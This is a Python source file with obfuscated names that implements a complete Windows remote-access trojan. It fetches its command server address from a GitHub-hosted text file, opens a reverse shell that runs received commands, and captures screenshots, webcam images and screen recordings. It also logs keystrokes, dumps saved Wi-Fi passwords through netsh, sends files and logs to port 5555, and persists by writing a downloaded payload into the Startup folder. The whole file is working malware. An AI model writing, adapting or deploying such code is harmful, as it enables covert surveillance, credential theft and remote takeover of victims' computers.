import urllib.request,subprocess,socket,time,os,json,base64,shutil,re
from datetime import datetime
cqpnDvxwZpIJpunPc = ""
yYhCFGJ = ""
kyBmlrDkKNkdsxyAYzREQ = "26.11.25.0"
DydlNMtOKLUVqxlaPD = True
CYIdjlRDQvHKMNxkhwBowR = "!"
PysgTlLfC = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
VbtEwZHKHerfjFNH = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
bcfWqlxrIVzusJynkflKp = os.path.expanduser("~\\AppData\\Local\\")
wrojfeFuw = os.path.expanduser("~\\AppData\\Roaming\\")
DkpULQExddwUHbQcAFoT = ""
def NmOHUVWoV(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def BiEkpbpGTJIGe(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	JEBpWQjmJSShDFMPmKn = data.decode("utf-8").replace("\n","")
	if not JEBpWQjmJSShDFMPmKn.startswith(CYIdjlRDQvHKMNxkhwBowR):
		proc = subprocess.run(JEBpWQjmJSShDFMPmKn, shell=True, capture_output=True)
		AgvjrfaBSeiX = proc.stdout + proc.stderr
		qtxWjmRfcAfsNCmFcSJtGb(s, AgvjrfaBSeiX)
		return
	UxOOhZITuj = JEBpWQjmJSShDFMPmKn.split(" ")[0][1:]
	args = " ".join(JEBpWQjmJSShDFMPmKn.split()[1:]).split()
	if UxOOhZITuj == "cd":
		moveDirectory(s, JEBpWQjmJSShDFMPmKn[4:])
	elif UxOOhZITuj == "screenshot":
		ZGTNcNhmXtAaGRipfS(s)
	elif UxOOhZITuj == "webcam":
		fRDgnqLPYLwxNWkb(s, args)
	elif UxOOhZITuj == "download":
		ISMXZadqITDJUqTcLn(s, JEBpWQjmJSShDFMPmKn)
	elif UxOOhZITuj == "upload":
		downloadFileFromServer(s, JEBpWQjmJSShDFMPmKn)
	elif UxOOhZITuj == "wifi":
		DmHoKnWBdkZFrT(s)
	elif UxOOhZITuj == "screenrecord":
		KMocPFBrMSfcyAFnuRzDx(s, args)
	elif UxOOhZITuj == "update":
		nGkOvnwpLoFdvru(s)
	elif UxOOhZITuj == "basename":
		qtxWjmRfcAfsNCmFcSJtGb(s, os.path.basename(__file__))
	else:
		qtxWjmRfcAfsNCmFcSJtGb(s,"")
def moveDirectory(s, path):
	try:
		os.chdir(path)
		qtxWjmRfcAfsNCmFcSJtGb(s,"")
	except:
		qtxWjmRfcAfsNCmFcSJtGb(s, "[!] 404")
def ISMXZadqITDJUqTcLn(s, JEBpWQjmJSShDFMPmKn):
	sYAfMlVCJUTcAizIWz = JEBpWQjmJSShDFMPmKn.replace(CYIdjlRDQvHKMNxkhwBowR+"download ","").split(",")
	AgvjrfaBSeiXs = ""
	for f in sYAfMlVCJUTcAizIWz:
		AgvjrfaBSeiXs += cBqIpFswvOoGzrOO(f, "api/file/", { "type":os.path.splitext(f)[1] })
	qtxWjmRfcAfsNCmFcSJtGb(s, AgvjrfaBSeiXs)
def ZGTNcNhmXtAaGRipfS(s):
	from PIL import ImageGrab
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	rswbEUaHiwyS = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(rswbEUaHiwyS)
	image.close()
	AgvjrfaBSeiX = cBqIpFswvOoGzrOO(rswbEUaHiwyS, "api/sscap")
	os.remove(rswbEUaHiwyS)
	qtxWjmRfcAfsNCmFcSJtGb(s, AgvjrfaBSeiX)
def fRDgnqLPYLwxNWkb(s, args):
	import cv2
	cameraNumber = 0
	fname = "wc.jpg"
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		cam = cv2.VideoCapture(cameraNumber)
		_, frame = cam.read()
		cv2.imwrite(bcfWqlxrIVzusJynkflKp+fname, frame)
		cam.release()
		r=cBqIpFswvOoGzrOO(bcfWqlxrIVzusJynkflKp+fname,"api/wc")
		os.remove(bcfWqlxrIVzusJynkflKp+fname)
		qtxWjmRfcAfsNCmFcSJtGb(s, r)
	except Exception as e:
		qtxWjmRfcAfsNCmFcSJtGb(s, "[!] 404: "+str(e))
def KMocPFBrMSfcyAFnuRzDx(s, args):
	import imageio
	from PIL import ImageGrab
	YnpjhWjKrcpdif = 15
	if not args == []:
		try: YnpjhWjKrcpdif = int(args[0])
		except: pass
	ZFGOZusmWatSTbDkbQDZCIO = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	weqqDCey = []
	fps = 11
	numFrames = YnpjhWjKrcpdif * fps
	for _ in range(numFrames):
		weqqDCey.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(ZFGOZusmWatSTbDkbQDZCIO, weqqDCey, fps=fps, quality=8)
	r=cBqIpFswvOoGzrOO(ZFGOZusmWatSTbDkbQDZCIO, "api/screc")
	os.remove(ZFGOZusmWatSTbDkbQDZCIO)
	qtxWjmRfcAfsNCmFcSJtGb(s, r)
def cBqIpFswvOoGzrOO(fovycuImMTZeuYgdF, sSrZFyiiFvKIi, tqAOhVTqH=None):
	import requests
	if not os.path.isfile(fovycuImMTZeuYgdF):
		return "[!] 404: "+fovycuImMTZeuYgdF+"\n"
	headers = {"user":os.getlogin()}
	if tqAOhVTqH is not None:
		headers = {**headers, **tqAOhVTqH}
	f = open(fovycuImMTZeuYgdF, "rb")
	requests.post("http://"+cqpnDvxwZpIJpunPc+":5555/"+sSrZFyiiFvKIi,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def downloadFileFromServer(s, JEBpWQjmJSShDFMPmKn):
	import requests
	guid = JEBpWQjmJSShDFMPmKn.split(" ")[-1]
	savePathName = JEBpWQjmJSShDFMPmKn.replace(CYIdjlRDQvHKMNxkhwBowR+"upload ","").replace(" "+guid,"")
	if os.path.exists(savePathName) or os.path.isfile(savePathName):
		qtxWjmRfcAfsNCmFcSJtGb(s, "[!] 409")
		return
	
	response = requests.get(f"http://{cqpnDvxwZpIJpunPc}:5555/api/content/{guid}", headers={"auth":"981xyz"})
	if response.status_code != 200:
		qtxWjmRfcAfsNCmFcSJtGb(s, "[!] 404")
		return
	
	with open(savePathName, "wb") as f:
		f.write(response.content)
	
	qtxWjmRfcAfsNCmFcSJtGb(s, "[+] 200")
def PtbAOLpbztHEbnyzNZqK(ZFUQQxSZxzdDcPCr, sSrZFyiiFvKIi):
	import requests
	if ZFUQQxSZxzdDcPCr.strip() == "":
		return "[!] 204"
	requests.post("http://"+cqpnDvxwZpIJpunPc+":5555/"+sSrZFyiiFvKIi,
		data=ZFUQQxSZxzdDcPCr,
		headers={"user":os.getlogin()})
	return "[+] 200"
def nGkOvnwpLoFdvru(s):
	h, p, v = MMrnwTuEQBWiIlfVTZbbSsZ(True)
	if (v != kyBmlrDkKNkdsxyAYzREQ):
		FUXoYroBYSRmzxMVordnq(v)
		qtxWjmRfcAfsNCmFcSJtGb(s, "[+] 200")
	else:
		qtxWjmRfcAfsNCmFcSJtGb(s, "[-] 304")
def DmHoKnWBdkZFrT(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		qtxWjmRfcAfsNCmFcSJtGb(s, "[!] 500")
		return
	jIRuVLMxvzlZHrLWOpE = ""
	for p in profiles:
		try: jIRuVLMxvzlZHrLWOpE+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: jIRuVLMxvzlZHrLWOpE+=f"    {p} - N/A"
	qtxWjmRfcAfsNCmFcSJtGb(s, jIRuVLMxvzlZHrLWOpE)
def FUXoYroBYSRmzxMVordnq(PhKXIvsWLVl):
	import requests
	global DydlNMtOKLUVqxlaPD
	rKeBbqjJMwyxRGBDANCTUOk = os.path.basename(__file__)
	fileType = rKeBbqjJMwyxRGBDANCTUOk.split(".")[-1]
	hzAlzixRmqE = rKeBbqjJMwyxRGBDANCTUOk.split(".")[0]+"."+PhKXIvsWLVl+".pyw" if fileType.startswith("py") else ".exe"
	AWfBZqRoOscwccmIzJXG = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), hzAlzixRmqE)
	if not os.path.isfile(AWfBZqRoOscwccmIzJXG):
		with open(AWfBZqRoOscwccmIzJXG, "w+") as f:
			f.write(requests.get(VbtEwZHKHerfjFNH+"file."+ "pyw" if AWfBZqRoOscwccmIzJXG.split(".")[-1].startswith("py") else "exe").text)
	else:
		DydlNMtOKLUVqxlaPD = False
def MMrnwTuEQBWiIlfVTZbbSsZ(force=False):
	global cqpnDvxwZpIJpunPc, yYhCFGJ
	if force or cqpnDvxwZpIJpunPc == "" or yYhCFGJ == "":
		while True:
			try:
				with urllib.request.urlopen(PysgTlLfC) as response:
					data = response.read().decode("utf-8").replace("\n","").split(":")
					cqpnDvxwZpIJpunPc = data[0].strip()
					yYhCFGJ = data[1].strip()
					PhKXIvsWLVl = data[2].strip()
					return cqpnDvxwZpIJpunPc, yYhCFGJ, PhKXIvsWLVl
			except:
				time.sleep(10)
def veJnvsRfPSsalEFalt():
	try:
		LnGZYgyMWqUFaGDNVOqDQ = "settings.xpb"
		NuRkhsjr = sorted([file for file in os.listdir(bcfWqlxrIVzusJynkflKp) if os.path.isfile(bcfWqlxrIVzusJynkflKp+"\\"+file) and file.endswith(LnGZYgyMWqUFaGDNVOqDQ.split(".")[-1])])
		if LnGZYgyMWqUFaGDNVOqDQ in NuRkhsjr:
			NuRkhsjr.remove(LnGZYgyMWqUFaGDNVOqDQ)
		tdZlrgvgySe = os.path.join(bcfWqlxrIVzusJynkflKp,LnGZYgyMWqUFaGDNVOqDQ)
		if len(NuRkhsjr) > 0:
			with open(tdZlrgvgySe, "ab+") as f:
				for file in NuRkhsjr:
					temp = os.path.join(bcfWqlxrIVzusJynkflKp,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		cBqIpFswvOoGzrOO(tdZlrgvgySe, "api/log")
		if os.path.isfile(tdZlrgvgySe):
			os.remove(tdZlrgvgySe)
	except:
		pass
def ppYOWFujNq():
	from pynput.keyboard import Listener
	import logging
	logging.basicConfig(filename=(bcfWqlxrIVzusJynkflKp+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def khcYhFirwkIXHEx(k):
		logging.info(str(k))
	k=Listener(on_press=khcYhFirwkIXHEx)
	OdFELtJYjSRFViz = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in OdFELtJYjSRFViz:
		l.setLevel(logging.CRITICAL)
	k.start()
def qtxWjmRfcAfsNCmFcSJtGb(clientSocket, ZFUQQxSZxzdDcPCr):
	formattedData = b""
	if type(ZFUQQxSZxzdDcPCr) == bytes:
		formattedData += ZFUQQxSZxzdDcPCr
	else:
		formattedData += bytes(ZFUQQxSZxzdDcPCr, "utf-8")
	formattedData += bytes("\n"+DkpULQExddwUHbQcAFoT+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def XcATiDpFRzVUtN():
	global DkpULQExddwUHbQcAFoT
	h, p, v = MMrnwTuEQBWiIlfVTZbbSsZ()
	try: veJnvsRfPSsalEFalt()
	except: pass
	try:
		if kyBmlrDkKNkdsxyAYzREQ != v:
			FUXoYroBYSRmzxMVordnq(v)
	except: pass
	try:
		if DydlNMtOKLUVqxlaPD:
			ppYOWFujNq()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	DkpULQExddwUHbQcAFoT = ("(old)"if kyBmlrDkKNkdsxyAYzREQ!=v else "")+"["+kyBmlrDkKNkdsxyAYzREQ+"] "+os.getlogin()+" - "
	while True:
		tQlkMXmkH=False
		try:
			s=NmOHUVWoV(h, p)
			qtxWjmRfcAfsNCmFcSJtGb(s, "")
			while not tQlkMXmkH:
				try: tQlkMXmkH=BiEkpbpGTJIGe(s)
				except Exception as e:
					qtxWjmRfcAfsNCmFcSJtGb(s, str(e))
			s.close()
		except:
			pass
		time.sleep(5)
XcATiDpFRzVUtN()
